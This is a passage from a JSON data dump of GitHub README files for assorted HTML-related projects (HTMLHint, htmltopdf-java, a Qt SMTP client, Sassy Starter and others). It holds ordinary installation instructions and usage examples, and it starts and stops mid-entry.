show-module-name\n\n\u5c40\u90e8\u8bbe\u7f6e\u662f\u5426\u663e\u793a\u6a21\u5757\u540d\u79f0\uff0c\u4f1a\u8986\u76d6\u5168\u5c40\u7684\u8bbe\u5b9a.\n\nSet `showModuleName` locally.\n\n# \u4e8b\u4ef6\n```html\n<editor @change=\"updateData\"><\/editor>\n```\n\n### change\n\n\u6bcf\u6b21\u5185\u5bb9\u6709\u53d8\u52a8\u65f6\u89e6\u53d1,\u56de\u4f20\u6539\u53d8\u540e\u7684\u5185\u5bb9.\n\nEmited when the content changes,and pass the current content as event data.\n\n# License\n[Apache-2.0](http:\/\/opensource.org\/licenses\/Apache-2.0)\n"},{"repo":"\/underscorediscovery\/realtime-multiplayer-in-html5","language":"JavaScript","readme_contents":"Realtime Multiplayer In HTML5\n=============================\n\nRead the article here : \nhttp:\/\/buildnewgames.com\/real-time-multiplayer\/\n\nView the demo here :\nhttp:\/\/notes.underscorediscovery.com:4004\/?debug\n\nAn example using node.js, socket.io and HTML5 Canvas to explain and demonstrate realtime multiplayer games in the browser.\n\n## Getting started (Using npm package.json)\n* Get node.js\n* run `npm install` inside the cloned folder\n* run `node app.js` inside the cloned folder\n* Visit http:\/\/127.0.0.1:4004\/?debug\n\n## Getting started (Manual install)\n\n* Get node.js\n* Install socket.io `npm install socket.io`\n* Install node-udid `npm install node-uuid`\n* Install express `npm install express`\n* Run `node app.js` inside the cloned folder\n* Visit http:\/\/127.0.0.1:4004\/?debug\n\n## License\n\nMIT Licensed. \nSee LICENSE if required.\n\n"},{"repo":"\/catchthecows\/AndroidImageMap","language":"Java","readme_contents":"eclipse quickstart:\n\n- git clone https:\/\/github.com\/catchthecows\/AndroidImageMap.git\n- Run Eclipse and choose a workspace\n- File|New->Project...\n- Select Android Project from Existing Code\n- Browse to AndroidImageMap and hit Finish\n\nAn implementation of an HTML map like element in an Android View:\n\n- Supports images as drawable or bitmap in layout\n- Allows for a list of area tags in xml\n- Enables use of cut and paste HTML area tags to a resource xml  (ie, the ability to take an HTML map - and image and use it with minimal editing)\n- Supports panning if the image is larger than the device screen\n- Supports pinch-zoom\n- Supports callbacks when an area is tapped.\n- Supports showing annotations as bubble text and provide callback if the bubble is tapped\n\n\nNew in this version:\nBy default, the initial image is resized to fit the view dimensions with no regard to maintaining aspect ratio.  This appears to be the most common use.  \n\nTo have the aspect ratio kept:\nchange this (ImageView.java line 54) to from true to false\nprivate boolean mFitImageToScreen=true;  \n\nCommon issues:\nNOTE: You will need to change the xmlns (xml namespace) to match the base package of your application\nxmlns:ctc=\"http:\/\/schemas.android.com\/apk\/res\/com.ctc.android.widget\"\nbecomes\nxmlns:ctc=\"http:\/\/schemas.android.com\/apk\/res\/YOURPACKAGE\"\n\nThe package is listed in your AndroidManifest.xml file (ie package=\"com.ctc.android.widget\" )\n\n\n\nUse notes:\n\nTo associate the map with the img, list the map in in ImageMap attributes\n\n<!--?xml version=\"1.0\" encoding=\"utf-8\"?-->\n<LinearLayout\n    xmlns:android=\"http:\/\/schemas.android.com\/apk\/res\/android\"\n    xmlns:ctc=\"http:\/\/schemas.android.com\/apk\/res\/com.ctc.android.widget\"\n    android:orientation=\"vertical\"\n    android:layout_width=\"fill_parent\"\n    android:layout_height=\"fill_parent\"\n    >\n    <com.ctc.android.widget.ImageMap\n        android:id=\"@+id\/map\"\n        android:layout_width=\"fill_parent\"\n        android:layout_height=\"fill_parent\"\n        android:src=\"@drawable\/usamap\"\n        ctc:map=\"usamap\"\/>\n<\/LinearLayout>\n\n\nThe area map is specified in your project at res\/xml\/map.xml\nOne difference over HTML maps is that each area must have an id. I went back and forth on this requirement, and I may change the code to allow for areas without id. The code will use the name attribute if present, otherwise it will look for title or alt.\n\n<!--?xml version=\"1.0\" encoding=\"utf-8\"?-->\n<maps xmlns:android=\"http:\/\/schemas.android.com\/apk\/res\/android\">\n    <map name=\"gridmap\">\n        <area id=\"@+id\/area1001\" shape=\"rect\" coords=\"118,124,219,226\" \/>\n        <area id=\"@+id\/area1002\" shape=\"rect\" coords=\"474,374,574,476\" \/>\n        <area id=\"@+id\/area1004\" shape=\"rect\" coords=\"710,878,808,980\" \/>\n        <area id=\"@+id\/area1005\" shape=\"circle\" coords=\"574,214,74\" \/>\n        <area id=\"@+id\/area1006\" shape=\"poly\" coords=\"250,780,250,951,405,951\" \/>\n        <area id=\"@+id\/area1007\" shape=\"poly\" coords=\"592,502,592,730,808,730,808,502,709,502,709,603,690,603,690,502\" \/>\n    <\/map>\n    <map name=\"usamap\">\n        <area id=\"@+id\/area1\" shape=\"poly\" coords=\"230,35,294,38,299,57,299,79,228,79\" \/>\n...\n     <\/map>\n<\/maps>\n\nThe image itself is placed in res\/drawable-nodpi so that the system will not attempt to fit the image to the device based on dpi. This way we are guaranteed that our area coordinates will map properly to the displayed image.  If you want to use different density drawables, you will have to make changes in the code based on the DisplayMetrics.density.\n\nHere is a sample activity that finds the view in the layout and adds an on click handler\n\npublic class ImageMapTestActivity extends Activity {\n    ImageMap mImageMap;\n \n    @Override\n    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.main);\n \n        \/\/ find the image map in the view\n        mImageMap = (ImageMap)findViewById(R.id.map);\n \n        \/\/ add a click handler to react when areas are tapped\n        mImageMap.addOnImageMapClickedHandler(new ImageMap.OnImageMapClickedHandler() {\n            @Override\n            public void onImageMapClicked(int id) {\n                \/\/ when the area is tapped, show the name in a\n                \/\/ text bubble\n                mImageMap.showBubble(id);\n            }\n \n            @Override\n            public void onBubbleClicked(int id) {\n                \/\/ react to info bubble for area being tapped\n            }\n        });\n    }\n}\n\nDon't hesitate to ask if you have any other questions.\n\n"},{"repo":"\/iandevlin\/html5bones","language":"HTML","readme_contents":"HTML5 Bones - The template that goes back to basics\n===================================================\n\n- Author: Ian Devlin [iandevlin.com](http:\/\/iandevlin.com)\n- Twitter: [@iandevlin](http:\/\/twitter.com\/iandevlin)\n- Website: [html5bones.com](http:\/\/html5bones.com)\n- Twitter: [@html5bones](http:\/\/twitter.com\/html5bones)\n\nPurpose\n=======\n\nThis template can be used as just that, a template to get you going in HTML5, or it can simply be used as a guide via the inline comments when building your own HTML5 page from scratch.\n\nFeatures\n========\n\n- Contains the most popular HTML5 structural elements and how to use them\n- Also contains templates for HTML5 video and audio and how to use them\n- Cross-browser compatible, down to and including Internet Explorer 7\n- Print CSS included in the main styles.css file\n- [Normalize.css](http:\/\/necolas.github.com\/normalize.css\/) is included to normalise CSS across browsers\n- Inline documentation\n- Reduced, non-commented version for main template also included\n- MIT license\n\nDocumentation\n=============\nThe documentation is contained within inline comments in the various files, but especially `main-template.html`.\n\nContribute\n==========\n\nYou are of course welcome to contribute, this is what GitHub is for.\n"},{"repo":"\/Nithinshah\/ESP8266-HTML-WiFi-Manager","language":"C++","readme_contents":"#Simple HTML page to Configure your ESP8266\n\n\n\n\nThis works with the ESP8266 Arduino platform with a recent stable release(2.0.0 or newer) \n"},{"repo":"\/wooio\/htmltopdf-java","language":"Java","readme_contents":"## Overview\nThis project is based on [wkhtmltopdf](https:\/\/github.com\/wkhtmltopdf\/wkhtmltopdf), which converts HTML documents to PDF.\nAccess to wkhtmltopdf is performed via JNA, exposed through a Java-friendly layer.\n\n## Get it\n\nGradle:\n```groovy\ncompile 'io.woo:htmltopdf:1.0.8'\n```\n\nMaven:\n```xml\n<dependency>\n  <groupId>io.woo<\/groupId>\n  <artifactId>htmltopdf<\/artifactId>\n  <version>1.0.8<\/version>\n  <scope>compile<\/scope>\n<\/dependency>\n```\n\n## Getting started\n\nThe following examples should be sufficient to get you started, however there\nare many more options discoverable by looking into the methods of `HtmlToPdf` and `HtmlToPdfObject`.\n\n#### Saving HTML as a PDF file\n\n```java\nboolean success = HtmlToPdf.create()\n    .object(HtmlToPdfObject.forHtml(\"<p><em>Apples<\/em>, not oranges<\/p>\"))\n    .convert(\"\/path\/to\/file.pdf\");\n```\n\n#### Saving a webpage from URL as a PDF file\n\n```java\nboolean success = HtmlToPdf.create()\n    .object(HtmlToPdfObject.forUrl(\"https:\/\/github.com\/wooio\/htmltopdf-java\"))\n    .convert(\"\/path\/to\/file.pdf\");\n```\n\n#### Saving multiple objects as a PDF file\n\n```java\nboolean success = HtmlToPdf.create()\n    .object(HtmlToPdfObject.forUrl(\"https:\/\/github.com\/wooio\/htmltopdf-java\"))\n    .object(HtmlToPdfObject.forHtml(\"<p>This is the second object...<\/p>\"))\n    \/\/ ...\n    .convert(\"\/path\/to\/file.pdf\");\n```\n\n#### Converting to InputStream (instead of saving as file)\n\nConverting to an InputStream would be useful if you intend on returning the resulting PDF document \nas an HTTP response or adding it as an email attachment\n\n```java\nHtmlToPdf htmlToPdf = HtmlToPdf.create()\n    \/\/ ...\n    .object(HtmlToPdfObject.forUrl(\"https:\/\/github.com\/wooio\/htmltopdf-java\"));\n\ntry (InputStream in = htmlToPdf.convert()) {\n    \/\/ \"in\" has PDF bytes loaded\n} catch (HtmlToPdfException e) {\n    \/\/ HtmlToPdfException is a RuntimeException, thus you are not required to\n    \/\/ catch it in this scope. It is thrown when the conversion fails\n    \/\/ for any reason.\n}\n```\n\n## Concurrency limitations\n\nWhile the library is thread-safe, it unfortunately cannot perform conversions concurrently.\nBecause wkhtmltopdf uses Qt behind the scenes to render webpages,\nthere is a single thread which performs such rendering across a single process. Therefore, at this point, it is only \npossible to perform one conversion at the same time per process.\n\n## Troubleshooting\n\n#### Missing native dependencies\nIf you get the following exception:\n```\njava.lang.UnsatisfiedLinkError: Unable to load library '\/tmp\/io.woo.htmltopdf\/wkhtmltox\/0.12.5\/libwkhtmltox.so': Native library (tmp\/io.woo.htmltopdf\/wkhtmltox\/0.12.5\/libwkhtmltox.so) not found in resource path\n```\nThen that likely means that one of the native dependencies of wkhtmltopdf is not met.\nIt might be worth checking that the following packages are installed:\n\n- libc6 (or glibc)\n- libx11\n- libxext\n- libxrender\n- libstdc++\n- libssl1.0\n- freetype\n- fontconfig\n\n"},{"repo":"\/htmlhint\/HTMLHint","language":"JavaScript","readme_contents":"<h1 align=\"center\">\n  <br>\n  <a href=\"https:\/\/htmlhint.com\"><img src=\"https:\/\/raw.githubusercontent.com\/htmlhint\/htmlhint\/develop\/src\/img\/htmlhint.png\" alt=\"Logo HTMLHint\" width=\"170\"><\/a>\n  <br>\n  HTMLHint\n  <br>\n<\/h1>\n\n<h4 align=\"center\">The static code analysis tool you need for your HTML.<\/h4>\n\n<p align=\"center\">\n  <a href=\"https:\/\/travis-ci.org\/htmlhint\/HTMLHint\">\n    <img src=\"https:\/\/img.shields.io\/travis\/htmlhint\/HTMLHint.svg\" alt=\"Travis Build Status\">\n  <\/a>\n  <a href=\"https:\/\/codecov.io\/gh\/htmlhint\/HTMLHint\">\n    <img src=\"https:\/\/codecov.io\/gh\/htmlhint\/HTMLHint\/branch\/master\/graph\/badge.svg\" alt=\"Codecov\">\n  <\/a>\n  <a href=\"https:\/\/www.npmjs.com\/package\/htmlhint\">\n    <img src=\"https:\/\/img.shields.io\/npm\/dm\/htmlhint.svg\" alt=\"NPM count\">\n  <\/a>\n  <img src=\"https:\/\/badgen.net\/badge\/license\/MIT\/green\" alt=\"MIT Licence\" \/>\n  <a href=\"https:\/\/discord.gg\/nJ6J9CP\">\n    <img src=\"https:\/\/img.shields.io\/badge\/chat-on%20discord-7289da.svg\" alt=\"Chat\">\n  <\/a>\n  <a href=\"http:\/\/roadmap.htmlhint.io\/roadmap\">\n    <img src=\"https:\/\/img.shields.io\/badge\/check-our%20roadmap-EE503E.svg\" alt=\"Chat\">\n  <\/a>\n<\/p>\n\n<p align=\"center\">\n\u00a0 <a href=\"#installation-and-usage\">How To Use<\/a> \u2022 <a href=\"#contributing\">Contributing<\/a> \u2022 <a href=\"http:\/\/roadmap.htmlhint.io\/\">Roadmap<\/a> \u2022 <a href=\"https:\/\/htmlhint.com\">Website<\/a>\n<\/p>\n\n## Table of Contents\n\n- **[Installation and Usage](#-installation-and-usage)**\n  - **[Local Installation and Usage](#local-installation-and-usage)**\n  - **[Global Installation and Usage](#global-installation-and-usage)**\n- **[Example output](#-example-output)**\n- **[Configuration](#-configuration)**\n- **[Docs](#-docs)**\n\n## \ud83d\udcdf Installation and Usage\n\nPrerequisites: Node.js (>=6.14), npm version 3+.\n\nThere are two ways to install HTMLHint: globally and locally.\n\n### Local Installation and Usage\n\nIn case you want to include HTMLHint as part of your project, you can install it locally using NPM:\n\n```\n$ npm install htmlhint --save-dev\n```\n\nAfter that, You can run HTMLHint on any file or directory like this:\n\n```\n$ .\/node_modules\/.bin\/htmlhint www\/index.html\n$ .\/node_modules\/.bin\/htmlhint www\/**\/*.html\n```\n\n### Global Installation and Usage\n\nIf you want to make HTMLHint available to tools that run across all of your projects, you can install HTMLHint globally using NPM:\n\n```\n$ npm install htmlhint -g\n```\n\nAfter that, you can run HTMLHint on any file like this:\n\n```\n$ htmlhint www\/index.html\n$ htmlhint www\/**\/*.html\n```\n\nYou can even launch HTMLHint to analyse an URL:\n\n```\n$ htmlhint https:\/\/htmlhint.com\/\n```\n\n## \ud83d\udcc3 Example output\n\n## \ud83d\udd27 Configuration\n\nSearch `.htmlhintrc` file in current directory and all parent directories:\n\n```\n$ htmlhint\n$ htmlhint test.html\n```\n\nCustom config file:\n\n```\n$ htmlhint --config htmlhint.conf test.html\n```\n\nCustom rules:\n\n```\n$ htmlhint --rules tag-pair,id-class-value=underline index.html\n```\n\nInline rules in `test.html`:\n\n```\n<!--htmlhint tag-pair,id-class-value:underline -->\n<html>\n<head>\n...\n```\n\n## \ud83d\udcd9 Docs\n\n1. [How to use](https:\/\/github.com\/htmlhint\/HTMLHint\/wiki\/Usage)\n2. [All Rules](https:\/\/github.com\/htmlhint\/HTMLHint\/wiki\/Rules)\n3. [How to Develop](https:\/\/github.com\/htmlhint\/HTMLHint\/wiki\/Developer-guide)\n\n## \u00a9 License\n\n[MIT License](.\/LICENSE.md)\n\n## \ud83d\udcaa\ud83c\udffb Contributors\n\nThis project exists thanks to all these people. [Contribute](CONTRIBUTING.md).\n<a href=\"https:\/\/github.com\/htmlhint\/HTMLHint\/graphs\/contributors\"><img src=\"https:\/\/opencollective.com\/htmlhint\/contributors.svg?width=890\" \/><\/a>\n\n## \ud83c\udfc5 Backers\n\nThank you to all our backers! [Become a backer](https:\/\/opencollective.com\/htmlhint#backer).\n\n<a href=\"https:\/\/opencollective.com\/htmlhint#backers\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/htmlhint\/backers.svg?width=890\"><\/a>\n\n## \ud83c\udf96 Sponsors\n\nSupport this project by becoming a sponsor. Your logo will show up here with a link to your website. [Become a sponsor](https:\/\/opencollective.com\/htmlhint#sponsor).\n\n<a href=\"https:\/\/opencollective.com\/htmlhint\/sponsor\/0\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/htmlhint\/sponsor\/0\/avatar.svg\"><\/a>\n"},{"repo":"\/minamarkham\/sassy-starter","language":"CSS","readme_contents":"<a href=\"https:\/\/www.patreon.com\/minamarkham\"><img src=\"https:\/\/c5.patreon.com\/external\/logo\/become_a_patron_button@2x.png\" width=\"150\"><\/a> [![forthebadge](http:\/\/forthebadge.com\/images\/badges\/built-with-love.svg)](http:\/\/forthebadge.com) [![forthebadge](http:\/\/forthebadge.com\/images\/badges\/uses-css.svg)](http:\/\/forthebadge.com) [![forthebadge](http:\/\/forthebadge.com\/images\/badges\/powered-by-netflix.svg)](http:\/\/forthebadge.com)\n\n# Sassy Starter [![Stories in Ready](https:\/\/badge.waffle.io\/minamarkham\/sassy-starter.png?label=ready&title=Ready)](https:\/\/waffle.io\/minamarkham\/sassy-starter)\n\nA starter toolkit based on [Scalable and Modular Architecture for CSS](http:\/\/smacss.com\/) (SMACSS) and [Atomic Design](http:\/\/atomicdesign.bradfrost.com) for [Sass](http:\/\/sass-lang.com\/) (SCSS) projects. Do what you'd like with it :)\n\nStyles are broken down into the following groups: **Base, Layout, Atoms, Molecules, Organisms, States, Themes, Utilities and Overrides**\n\n## Getting Started\n\n1. If needed, [install](http:\/\/blog.nodeknockout.com\/post\/65463770933\/how-to-install-node-js-and-npm) `node` and `npm` (Node Package Manager).\n- If needed, install `gulp` with `npm install gulp -g`.\n- Clone this repo with `git clone https:\/\/github.com\/minamarkham\/sassy-starter` or download the zip.\n- In terminal, `cd` to the folder containing your project. Alternatively, you can type `cd ` and drag the location of the folder into your terminal and hit enter (on Macs).\n- In terminal, type `npm install`. If (and _only_ if) `npm install` isn't working, try `sudo npm install`. This should install all [dependencies](#dependencies).\n- In terminal, enter `gulp`.\n- Your browser should open at `http:\/\/localhost:3000`. You can access this same page on any device on the same wifi network and they'll see whats on your screen. It'll even sync scrolls and clicks!\n- Edit your code inside of the `src` folder.\n- Your complied and minified css, html, and javascript files will be created and updated in `dist\/`. Never edit files within the `dist\/` folder, as it gets deleted frequently.\n- Keep `gulp` running while you're making changes. When you want to stop the gulp task, hit `ctrl + C`.\n\n_For theming: add separate file (theme.scss) in`src\/scss\/themes\/`, override the default `$theme` variable, and run `gulp themes`._\n\n## Requirements\n- Node\/NPM\n- LibSass\n- Gulp\n\n## Features\n- Live reloading with BrowserSync\n- Image Minification\n- Github Pages deployment\n- Sass linting (based on [default](https:\/\/github.com\/sasstools\/sass-lint\/blob\/master\/lib\/config\/sass-lint.yml) config)\n- Autoprefixer configuration\n- SMACSS and Atomic Design-based folder structure\n- `px` to `em`, `px` to `rem` and other useful functions.\n- Mixins for inlining media queries.\n* Useful CSS helper classes.\n* Default print styles, performance optimized.\n* \"Delete-key friendly.\" Easy to strip out parts you don't need.\n- Includes:\n  - [`Normalize.css`](https:\/\/necolas.github.com\/normalize.css\/)\n    for CSS normalizations and common bug fixes\n  - [`CSS Pesticide`](https:\/\/pesticide.io)\n    for easy CSS debugging\n  - [`jQuery`](https:\/\/jquery.com\/) via CDN, with a local fallback\n  - [`Modernizr`](http:\/\/modernizr.com\/), via CDN, for feature\n    detection\n  - [`Apache Server Configs`](https:\/\/github.com\/h5bp\/server-configs-apache)\n    that, among other, improve the web site's performance and security\n\n## Dependencies\n```\n  \"browser-sync\": \"^2.0.0-rc4\",\n  \"colors\": \"^1.1.2\",\n  \"del\": \"^2.0.2\",\n  \"gulp-autoprefixer\": \"^2.1.0\",\n  \"gulp-concat\": \"^2.4.3\",\n  \"gulp-gh-pages\": \"^0.4.0\",\n  \"gulp-imagemin\": \"^2.1.0\",\n  \"gulp-jshint\": \"^1.9.0\",\n  \"gulp-minify-css\": \"^0.3.12\",\n  \"gulp-minify-html\": \"^0.1.8\",\n  \"gulp-notify\": \"^2.2.0\",\n  \"gulp-plumber\": \"^0.6.6\",\n  \"gulp-rename\": \"^1.2.0\",\n  \"gulp-sass\": \"^1.3.2\",\n  \"gulp-sass-lint\": \"1.0.1\",\n  \"gulp-size\": \"^1.2.0\",\n  \"gulp-sourcemaps\": \"^1.5.2\",\n  \"gulp-uglify\": \"^1.0.2\",\n  \"imagemin-pngquant\": \"^4.0.0\",\n  \"sassdoc\": \"^2.1.15\",\n  \"vinyl-paths\": \"^2.0.0\"\n```\n\n## Tasks\n- clean:dist\n- styles\n- browser-sync\n- deploy\n- js-app\n- js-libs\n- sass-lint\n- minify-html\n- watch\n- imagemin\n- stats\n- sassdoc\n- themes\n- default\n  - clean:dist\n  - browser-sync\n  - js-app\n  - js-libs\n  - imgmin\n  - minify-html\n  - styles\n  - watch\n- build\n  - clean:dist\n  - js-app\n  - js-libs\n  - imgmin\n  - minify-html\n  - styles\n  - copy\n- audit\n  - sass-lint\n  - stats\n\n## Directory structure\n\n```\n\u250c\u2500\u2500 .gitignore\n\u251c\u2500\u2500 .htaccess\n\u251c\u2500\u2500 .sass-lint.yml\n\u251c\u2500\u2500 .travis.yml\n\u251c\u2500\u2500 src\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 browserconfig.xml\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 crossdomain.xml\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 humans.txt\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 icons\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 apple-touch-icon-114x114-precomposed.png\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 apple-touch-icon-57x57-precomposed.png\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 apple-touch-icon-72x72-precomposed.png\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 apple-touch-icon-precomposed.png\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 apple-touch-icon.png\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 favicon.ico\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 favicon.png\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 img\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 index.html\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 js\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 robots.txt\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 atoms\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 _index.scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 base\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 _base.scss\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 _index.scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 layout\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 _index.scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 libs\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 _index.scss\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 _normalize.scss\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 _pesticide.scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 molecules\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 _index.scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 organisms\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 _index.scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 overrides\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 _index.scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 states\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 _index.scss\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 _print.scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 themes\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 rebeccapurple.scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 utilities\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 _colors.scss\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 _config.scss\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 _fonts.scss\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 _functions.scss\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 _index.scss\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 _mixins.scss\n\u2502\u00a0\u00a0     \u2502   \u2514\u2500\u2500 _typography.scss\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 styles.scss\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 _shame.scss\n\u251c\u2500\u2500 gulpfile.js\n\u2514\u2500\u2500 package.json\n```\n\n## Bugs & Support\nDeveloped by [@MinaMarkham](http:\/\/twitter.com\/MinaMarkham). Please list all bugs and feature requests in the Github issue tracker.\n\n## Thanks & Resources\n\nThis toolkit is based on the work of the following fine people & projects.\n\n- [HTML5 Boilerplate](https:\/\/github.com\/h5bp\/html5-boilerplate)\n- [Scalable and Modular Architecture for CSS](http:\/\/smacss.com\/book) (<abbr title=\"Scalable and Modular Architecture for CSS\">SMACSS<\/abbr>)\n- [Atomic Design](http:\/\/atomicdesign.bradfrost.com)\n"},{"repo":"\/angular\/angular.js","language":"JavaScript","readme_contents":"Using AngularJS with the Closure Compiler\n=========================================\n\nThe Closure Compiler project contains definitions for the AngularJS JavaScript\nin its `contrib\/externs` directory.\n\nThe definitions contain externs for use with the Closure compiler (aka\nJSCompiler). Passing these files to the --externs parameter of a compiler\npass allows using type annotations for AngularJS objects. For example,\nAngularJS's $scope objects can be annotated as:\n```js\n\/** @type {angular.Scope} *\/\nvar scope = $scope;\n```\n\nThis allows JSCompiler to type check accesses to scope, give warnings about\nmissing methods or incorrect arguments, and also prevents renaming of property\naccesses with advanced compilation.\n\nThe externs are incomplete and maintained on an as-needed basis, but strive to\nbe correct. Externs for individual modules should be added in separate files.\n\nSee https:\/\/developers.google.com\/closure\/compiler\/\n"},{"repo":"\/bluetiger9\/SmtpClient-for-Qt","language":"C++","readme_contents":"SMTP Client for Qt (C++) - Version 1.1\n=============================================\n\nThe SmtpClient for Qt is small library writen for Qt 4 (C++ version) that allows application to send complex emails (plain text, html, attachments, inline files, etc.) using the Simple Mail Transfer Protocol (SMTP).\n\n## New in version 1.1:\n\n- TLS (STARTTLS) connection is now supported\n\n- multiple types of recipients (to, cc, bcc)\n\n- nested mime emails (mixed\/alternative, mixed\/related)\n\n- output compilant with RFC2045\n\n\n## SMPT Client for Qt supports\n\n- TCP and SSL connections to SMTP servers\n\n- SMTP authentication (PLAIN and LOGIN methods)\n\n- sending MIME emails (to multiple recipients)\n\n- plain text and HTML (with inline files) content in emails\n\n- multiple attachments and inline files (used in HTML)\n\n- different character sets (ascii, utf-8, etc) and encoding methods (7bit, 8bit, base64)\n\n- error handling\n\n## Examples\n\nLets see a simple example:\n\n```c++\n#include <QtGui\/QApplication>\n#include \"..\/src\/SmtpMime\"\n\nint main(int argc, char *argv[])\n{\n    QApplication a(argc, argv);\n\n    \/\/ This is a first demo application of the SmtpClient for Qt project\n\n    \/\/ First we need to create an SmtpClient object\n    \/\/ We will use the Gmail's smtp server (smtp.gmail.com, port 465, ssl)\n\n    SmtpClient smtp(\"smtp.gmail.com\", 465, SmtpClient::SslConnection);\n\n    \/\/ We need to set the username (your email address) and the password\n    \/\/ for smtp authentification.\n\n    smtp.setUser(\"your_email_address@gmail.com\");\n    smtp.setPassword(\"your_password\");\n\n    \/\/ Now we create a MimeMessage object. This will be the email.\n\n    MimeMessage message;\n\n    message.setSender(new EmailAddress(\"your_email_address@gmail.com\", \"Your Name\"));\n    message.addRecipient(new EmailAddress(\"recipient@host.com\", \"Recipient's Name\"));\n    message.setSubject(\"SmtpClient for Qt - Demo\");\n\n    \/\/ Now add some text to the email.\n    \/\/ First we create a MimeText object.\n\n    MimeText text;\n\n    text.setText(\"Hi,\\nThis is a simple email message.\\n\");\n\n    \/\/ Now add it to the mail\n\n    message.addPart(&text);\n\n    \/\/ Now we can send the mail\n\n    smtp.connectToHost();\n    smtp.login();\n    smtp.sendMail(message);\n    smtp.quit();\n\n}\n```\n\nFor more examples see the [Wiki\/Examples](https:\/\/github.com\/bluetiger9\/SmtpClient-for-Qt\/wiki\/Examples).\n\n## License\n\nThis project (all files including the demos\/examples) is licensed under the GNU LGPL, version 2.1.\n\n\n**Copyright (c) 2011 - T\u0151k\u00e9s Attila**\n"},{"repo":"\/yyx990803\/HTML5-Clear-v2","language":"JavaScript","readme_contents":"# HTML5 Clear\n\nWork in progress. See `TODO.md` for features not implemented yet. See it in action: [http:\/\/clear.evanyou.me](http:\/\/clear.evanyou.me).\n\nYou can also watch [the original HTML5 Clear video](https:\/\/vimeo.com\/37182785).\n\nThe [original iOS app](http:\/\/www.realmacsoftware.com\/clear\/) is designed and developed by [Realmac Software](http:\/\/www.realmacsoftware.com\/) in collaboration with [Helftone](http:\/\/helftone.com) and [Impending, Inc.](http:\/\/impending.com). This project is simply a personal attempt to test my limit in building intricate interfaces with HTML5.\n\n### Notes\n\n- Works offline (add to iOS homescreen)\n- Uses local storage\n\n### Load it as a Chrome packaged app:\n\nYou might need to use Chrome Canary or enable the `Experimental Extension APIs` flag to load this as a Chrome packaged app.\n\n- clone the repo, checkout branch `chrome-app`\n- In Chrome, open `Tools -> Extensions`\n- check `Developer Mode`\n- Click `Load unpacked extension` and load this project\n\n### Author\n\nTwitter: [@youyuxi](https:\/\/twitter.com\/youyuxi)\n\u65b0\u6d6a\u5fae\u535a: [@\u5c24\u5c0f\u53f3](http:\/\/weibo.com\/arttechdesign)"},{"repo":"\/Tinywan\/html5-dash-hls-rtmp","language":"JavaScript","readme_contents":"##  :bouquet: \u591a\u5a92\u4f53\u67b6\u6784\u8bbe\u8ba1  \n![\u591a\u5a92\u4f53\u67b6\u6784\u8bbe\u8ba1](\/Images\/video-system.png)  \n###### :bird: \u652f\u6301\u7684\u76f4\u64ad\u6d41\u8f93\u5165\u534f\u8bae  \n* RTMP \u7528\u4e8e\u62c9\u53d6\u548c\u53d1\u5e03\u7684\u6d41  \n* RTSP \u4e3a\u62c9\u548c\u5ba3\u5e03\u7684\u6d41  \n* \u7528\u4e8eHTTP\u548cUDP\u6d41\u7684 MPEG-TS  \n* SRT 